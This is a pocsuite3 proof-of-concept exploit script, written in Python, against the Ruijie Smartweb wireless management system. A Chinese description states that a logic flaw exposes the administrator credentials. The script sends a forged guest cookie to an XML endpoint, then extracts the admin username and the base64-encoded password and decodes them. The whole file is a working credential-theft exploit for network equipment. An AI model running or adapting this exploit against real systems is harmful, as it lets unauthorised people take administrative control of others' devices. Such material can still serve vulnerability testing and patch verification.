from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re,base64
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '锐捷Smartweb管理系统 密码信息泄露漏洞'
    appName = '锐捷Smartweb'
    appVersion = '<2.26.2'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        headers = {
            'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302',
        }
        try:
            target = self.url+"/web/xml/webuser-auth.xml"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            if r.status_code == 200 and "Authorization Required" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):#验证模式
        result = {}
        headers = {
            'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302',
        }
        try:
            target = self.url+"/web/xml/webuser-auth.xml"
            r = requests.get(url=target,timeout=8,verify=False,headers=headers)
            matchuser = re.search(r'<user><name><!\[CDATA\[   (.*?)\]\]></name>',r.text,re.M|re.I)
            matchpass = re.search(r'<password><!\[CDATA\[   (.*?)\]\]></password>',r.text,re.M|re.I)
            mima = matchpass.group(1)
            temp = base64.b64decode(mima)
            if r.status_code == 200 and "Authorization Required" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['UserName'] = matchuser.group(1)
                result['verifyInfo']['Password'] = temp.decode()
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)